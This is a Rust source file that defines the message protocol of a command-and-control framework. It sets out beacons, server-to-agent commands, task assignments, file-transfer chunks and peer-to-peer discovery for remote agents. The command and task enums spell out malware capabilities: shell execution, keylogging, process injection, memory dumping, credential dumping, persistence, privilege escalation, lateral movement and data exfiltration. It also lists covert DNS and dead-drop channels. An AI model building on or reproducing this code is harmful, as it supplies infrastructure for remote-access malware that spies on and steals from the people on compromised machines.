//! Message types for C2 communication.
//!
//! All messages are encrypted and authenticated before transmission.

use serde::{Deserialize, Serialize};
use uuid::Uuid;
use chrono::{DateTime, Utc};

/// Message type identifier
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type")]
pub enum MessageType {
    /// Agent beacon/heartbeat
    Beacon(BeaconMessage),
    /// Command from server to agent
    Command(CommandMessage),
    /// Response from agent to command
    Response(ResponseMessage),
    /// Task assignment
    Task(TaskMessage),
    /// Task result
    TaskResult(TaskResultMessage),
    /// File transfer chunk
    FileChunk(FileChunkMessage),
    /// Agent status update
    Status(StatusMessage),
    /// P2P discovery message
    Discovery(DiscoveryMessage),
    /// Encrypted payload (generic)
    Payload(PayloadMessage),
}

/// Beacon message sent by agent to server
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BeaconMessage {
    pub agent_id: Uuid,
    pub timestamp: DateTime<Utc>,
    pub uptime: u64,
    pub last_seen: DateTime<Utc>,
    pub capabilities: Vec<String>,
    pub metadata: Option<AgentMetadata>,
}

/// Agent/Node role in the C2 hierarchy
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum AgentRole {
    /// Master server - controls agents and other servers
    Master,
    /// Slave agent - executes commands from master
    Slave,
    /// P2P node - participates in mesh network
    Node,
    /// Hybrid - can act as master, slave, and node simultaneously
    Hybrid,
}

impl Default for AgentRole {
    fn default() -> Self {
        AgentRole::Hybrid
    }
}

/// Agent metadata
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentMetadata {
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub pid: u32,
    pub parent_pid: u32,
    pub working_dir: String,
    pub environment: Option<Vec<(String, String)>>,
    pub role: AgentRole,
    pub master_id: Option<Uuid>, // If slave, which master controls us
    pub connected_nodes: Vec<Uuid>, // If node, connected P2P peers
}

/// Command message from server to agent
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandMessage {
    pub id: Uuid,
    pub agent_id: Uuid,
    pub command: CommandType,
    pub payload: Option<Vec<u8>>,
    pub priority: Priority,
    pub timeout: Option<u64>, // milliseconds
    pub created_at: DateTime<Utc>,
}

/// Command types
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "kind")]
pub enum CommandType {
    /// Execute shell command
    Execute {
        command: String,
        working_dir: Option<String>,
        timeout: Option<u64>,
    },
    /// Upload file
    Upload {
        path: String,
        overwrite: bool,
    },
    /// Download file
    Download {
        path: String,
        chunk_size: usize,
    },
    /// Screenshot
    Screenshot,
    /// Keylog start/stop
    Keylog {
        action: KeylogAction,
    },
    /// Process manipulation
    Process {
        action: ProcessAction,
        pid: Option<u32>,
        command: Option<String>,
    },
    /// Network operations
    Network {
        action: NetworkAction,
        target: Option<String>,
    },
    /// Custom payload execution
    ExecutePayload {
        payload: Vec<u8>,
        arguments: Vec<String>,
    },
    /// Sleep/jitter configuration
    Configure {
        sleep_interval: Option<u64>,
        jitter: Option<f32>,
    },
    /// Agent kill/reboot
    Lifecycle {
        action: LifecycleAction,
    },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum KeylogAction {
    Start,
    Stop,
    Flush,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ProcessAction {
    List,
    Kill,
    Spawn,
    Inject,
    DumpMemory,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum NetworkAction {
    Scan,
    PortForward,
    Proxy,
    Capture,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum LifecycleAction {
    Kill,
    Reboot,
    Sleep,
    Wake,
}

/// Response from agent to command
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ResponseMessage {
    pub command_id: Uuid,
    pub agent_id: Uuid,
    pub status: ResponseStatus,
    pub output: Option<Vec<u8>>,
    pub error: Option<String>,
    pub completed_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ResponseStatus {
    Success,
    Failed,
    Pending,
    Timeout,
}

/// Task assignment
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskMessage {
    pub id: Uuid,
    pub agent_id: Uuid,
    pub task_type: TaskType,
    pub parameters: serde_json::Value,
    pub priority: Priority,
    pub deadline: Option<DateTime<Utc>>,
    pub created_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum TaskType {
    Reconnaissance,
    Persistence,
    PrivilegeEscalation,
    LateralMovement,
    DataExfiltration,
    WebDelivery,
    CredentialDump,
    Custom,
}

/// Task result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskResultMessage {
    pub task_id: Uuid,
    pub agent_id: Uuid,
    pub status: TaskStatus,
    pub result: Option<serde_json::Value>,
    pub artifacts: Vec<String>, // base64 encoded file paths or data
    pub completed_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum TaskStatus {
    Completed,
    Failed { reason: String },
    Partial { completed: u32, total: u32 },
    Cancelled,
}

/// File transfer chunk
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileChunkMessage {
    pub transfer_id: Uuid,
    pub agent_id: Uuid,
    pub filename: String,
    pub chunk_index: u32,
    pub total_chunks: u32,
    pub data: Vec<u8>,
    pub offset: u64,
}

/// Agent status update
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StatusMessage {
    pub agent_id: Uuid,
    pub status: AgentStatus,
    pub timestamp: DateTime<Utc>,
    pub details: Option<serde_json::Value>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum AgentStatus {
    Online,
    Idle,
    Busy,
    Sleeping,
    Error { message: String },
    Dead,
}

/// P2P discovery message
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DiscoveryMessage {
    pub sender_id: Uuid,
    pub message_type: DiscoveryType,
    pub payload: Option<Vec<u8>>,
    pub ttl: u8,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum DiscoveryType {
    Hello,
    Ack,
    Relay,
    Query,
}

/// Generic encrypted payload
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadMessage {
    pub id: Uuid,
    pub payload_type: String,
    pub data: Vec<u8>,
    pub metadata: Option<serde_json::Value>,
}

/// Priority levels
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, PartialOrd)]
pub enum Priority {
    Low = 0,
    Normal = 1,
    High = 2,
    Critical = 3,
}

impl Default for Priority {
    fn default() -> Self {
        Priority::Normal
    }
}

/// Envelope for encrypted messages
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MessageEnvelope {
    pub version: u32,
    pub sequence: u64,
    pub timestamp: u64, // Unix timestamp in ms
    pub channel: ChannelType,
    pub encrypted_payload: Vec<u8>,
    pub auth_tag: [u8; 16], // For AEAD authentication
}

/// Communication channel type
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum ChannelType {
    Https,
    Ws,
    Dns,
    P2P,
    DeadDrop,
    Quic,
}
